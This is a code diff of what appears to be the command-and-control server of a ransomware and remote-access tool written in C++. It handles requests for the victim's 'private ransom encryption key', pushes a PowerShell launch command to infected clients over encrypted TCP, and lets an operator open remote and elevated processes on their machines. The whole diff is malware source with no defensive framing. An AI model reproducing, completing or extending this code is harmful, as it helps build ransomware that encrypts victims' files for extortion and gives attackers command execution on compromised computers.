@@ -295,8 +295,12 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 
 		ServerCommand reply = {};
 		reply.action = RemoteAction::kReturnPrivateRSAKey;
+		// TODO: dont insert private encryption key cause the buffer cant hold it (max 256 when trying to insert 4096+- key)
+		// find another way to send the private encryption key. could just be normal
+		 
+	
+		//reply.insert(TCPClient)
 		//reply.privateEncryptionKey = Serialization::SerializeString(TCPClient->GetRansomSecrets().strPrivateKey);
-		reply.valid = TRUE;
 
 		std::cout << "received request for private ransom encryption key\n";
 		success = NetCommon::TransmitData(reply, TCPClient->GetSocket(), TCP, NetCommon::_default, TRUE,	TCPClient->ClientPublicKey, FALSE);
@@ -337,11 +341,23 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		GetClientSaveFile(client->ClientUID);
 
 	SaveServerState();
-
+	
 	// tcp receive main loop
 	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
 	BYTESTRING command = Serialization::SerializeString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ");
-	BYTESTRING encrypted = LGCrypto::RSAEncrypt(command, client->ClientPublicKey, FALSE);
+	Packet test;
+	errno_t copied = memcpy_s(test.buffer, MAX_BUFFER_LEN, command.data(), command.size());
+	test.buffLen = command.size();
+	if ( copied != 0 ) {
+		std::cout << "buffer overflow\n";
+	}
+	char buff2[MAX_BUFFER_LEN];
+	memcpy(buff2, test.buffer, MAX_BUFFER_LEN);
+	buff2[command.size() + 1] = '\0';
+	std::cout << buff2 << std::endl;
+
+	BYTESTRING packet = Serialization::SerializeStruct(test);
+	BYTESTRING encrypted = LGCrypto::RSAEncrypt(packet, client->ClientPublicKey, FALSE);
 	NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
 	std::cout << "?" << std::endl;
 
@@ -351,12 +367,12 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(), TRUE, client->ClientPublicKey);
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(), TRUE, this->m_SessionKeys.priv);
 			continue;
 		}
 
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(), TRUE, client->ClientPublicKey);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(), TRUE, this->m_SessionKeys.priv);
 		std::cout << "received a message from a client on tcp\n";
 
 		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
@@ -419,14 +435,12 @@ BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outpu
 	switch ( command ) {
 	case RemoteAction::KOpenElevatedProcess:
 		std::cout << "Opening elevated remote process.\n";
-		cmdInfo.remoteContext = SecurityContext::TrustedInstaller;
 		std::cout << "Enter arguments for command line: " << std::endl;
 	case RemoteAction::kOpenRemoteProcess: {
 		std::string input;
 		std::cin >> input;
 		std::cout << "your input: " << input << std::endl;
-		cmdInfo.commandLineArguments = Serialization::SerializeString(input);
-		cmdInfo.valid = TRUE;
+		cmdInfo.insert(input);
 		performed = TRUE;
 		break;		
 	}
@@ -496,7 +510,7 @@ void ServerInterface::RunUserInputOnClients() {
 			system("pause");
 		}
 		else {
-			std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
+			//std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
 			system("pause");
 		}
 
@@ -736,7 +750,6 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 	// send the ping to the client over tcp
 	ServerCommand pingCommand;
 	pingCommand.action = RemoteAction::kPingClient;
-	pingCommand.valid = TRUE;
 	
 	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
 	if ( !sent )
